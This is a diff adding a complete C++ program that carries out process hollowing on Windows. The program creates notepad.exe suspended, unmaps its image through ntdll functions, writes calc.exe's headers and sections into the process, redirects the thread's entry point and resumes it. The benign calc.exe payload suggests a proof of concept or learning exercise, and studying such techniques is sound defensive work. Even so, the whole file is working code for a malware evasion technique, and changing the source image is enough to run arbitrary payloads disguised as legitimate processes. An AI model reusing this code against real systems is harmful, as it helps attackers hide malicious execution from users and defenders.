@@ -1,0 +1,173 @@
+#include <Windows.h>
+#include <iostream>
+#include <tchar.h>
+
+// Manually define STATUS_SUCCESS
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+
+typedef LONG NTSTATUS;
+typedef LONG(NTAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
+typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, UINT, PVOID, ULONG, PULONG);
+
+// Define the PEB_LDR_DATA structure (partially)
+typedef struct _PEB_LDR_DATA {
+    BYTE Reserved1[8];
+    PVOID Reserved2[3];
+    LIST_ENTRY InMemoryOrderModuleList;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
+
+// Define the PEB structure
+typedef struct _PEB {
+    BYTE Reserved1[2];
+    BYTE BeingDebugged;
+    BYTE Reserved2[1];
+    PVOID Reserved3[2];
+    PPEB_LDR_DATA Ldr;
+    PVOID ProcessParameters;
+    BYTE Reserved4[104];
+    PVOID Reserved5[52];
+    PVOID ImageBaseAddress;  // This is what we're interested in
+} PEB, * PPEB;
+
+// Define the PROCESS_BASIC_INFORMATION structure
+typedef struct _PROCESS_BASIC_INFORMATION {
+    NTSTATUS ExitStatus;
+    PPEB PebBaseAddress;
+    ULONG_PTR AffinityMask;
+    LONG BasePriority;
+    ULONG_PTR UniqueProcessId;
+    ULONG_PTR InheritedFromUniqueProcessId;
+} PROCESS_BASIC_INFORMATION;
+
+using namespace std;
+
+int main() {
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    memset(&pi, 0, sizeof(pi));
+
+    wchar_t notepad[] = L"C:\\Windows\\System32\\notepad.exe";
+    wchar_t sourceImage[] = L"C:\\Windows\\System32\\calc.exe"; 
+
+    if (CreateProcess(NULL, notepad, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        cout << "Process Created!" << endl;
+
+        // Load NtUnmapViewOfSection
+        pNtUnmapViewOfSection pUnmapView = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtUnmapViewOfSection");
+        if (pUnmapView == NULL) {
+            cout << "Failed to get NtUnmapViewOfSection: " << GetLastError() << endl;
+            return 1;
+        }
+
+        // Load NtQueryInformationProcess 
+        pNtQueryInformationProcess pQueryInfo = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
+        if (pQueryInfo == NULL) {
+            cout << "Failed to get NtQueryInformationProcess: " << GetLastError() << endl;
+            return 1;
+        }
+
+        // Get Base Address using NtQueryInformationProcess
+        PROCESS_BASIC_INFORMATION pbi;
+        ULONG retLen;
+        NTSTATUS status = pQueryInfo(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen);
+        if (status != STATUS_SUCCESS) {
+            cout << "Failed to get process information: " << status << endl;
+            return 1;
+        }
+
+        // Read ImageBaseAddress from the PEB in the remote process
+        PVOID baseAddr;
+        if (!ReadProcessMemory(pi.hProcess, &pbi.PebBaseAddress->ImageBaseAddress, &baseAddr, sizeof(PVOID), NULL)) {
+            cout << "Failed to read ImageBaseAddress from PEB: " << GetLastError() << endl;
+            return 1;
+        }
+
+        // Unmap the original PE
+        if (pUnmapView(pi.hProcess, baseAddr) != STATUS_SUCCESS) {
+            cout << "Failed to unmap the PE: " << GetLastError() <<  endl;
+            return 1;
+        }
+        cout << "PE Unmapped Successfully!" << endl;
+
+        // Load the new executable
+        HANDLE hFile = CreateFile(sourceImage, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            cout << "Failed to open source image: " << GetLastError() << endl;
+            return 1;
+        }
+
+        DWORD fileSize = GetFileSize(hFile, NULL);
+        BYTE* fileBuffer = new BYTE[fileSize];
+        DWORD bytesRead;
+        ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL);
+        CloseHandle(hFile);
+
+        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
+        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBuffer + dosHeader->e_lfanew);
+
+        // Allocate memory for the new image
+        PVOID remoteImage = VirtualAllocEx(pi.hProcess, baseAddr, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!remoteImage) {
+            cout << "Failed to allocate memory in remote process: " << GetLastError() << endl;
+            return 1;
+        }
+
+        // Write the headers
+        if (!WriteProcessMemory(pi.hProcess, remoteImage, fileBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
+            cout << "Failed to write headers to remote process: " << GetLastError() << endl;
+            return 1;
+        }
+
+        // Write the sections
+        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)ntHeaders + sizeof(IMAGE_NT_HEADERS));
+        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+            if (sectionHeader[i].SizeOfRawData > 0) {
+                PVOID sectionDest = (PVOID)((DWORD_PTR)remoteImage + sectionHeader[i].VirtualAddress);
+                PVOID sectionSrc = (PVOID)((DWORD_PTR)fileBuffer + sectionHeader[i].PointerToRawData);
+
+                if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc, sectionHeader[i].SizeOfRawData, NULL)) {
+                    cout << "Failed to write section to remote process: " << GetLastError() << endl;
+                    return 1;
+                }
+            }
+        }
+
+        // Set the entry point
+        CONTEXT ctx;
+        ctx.ContextFlags = CONTEXT_FULL;
+        if (!GetThreadContext(pi.hThread, &ctx)) {
+            cout << "Failed to get thread context: " << GetLastError() << endl;
+            return 1;
+        }
+
+#ifdef _WIN64
+        ctx.Rcx = (DWORD_PTR)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+#else
+        ctx.Eax = (DWORD_PTR)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+#endif
+
+        if (!SetThreadContext(pi.hThread, &ctx)) {
+            cout << "Failed to set thread context: " << GetLastError() << endl;
+            return 1;
+        }
+
+        // Resume the thread
+        if (ResumeThread(pi.hThread) == (DWORD)-1) {
+            cout << "Failed to resume thread: " << GetLastError() << endl;
+            return 1;
+        }
+
+        cout << "Process hollowing completed successfully!" << endl;
+    }
+    else {
+        cout << "Process Not Created: " << GetLastError() << endl;
+    }
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return 0;
+}
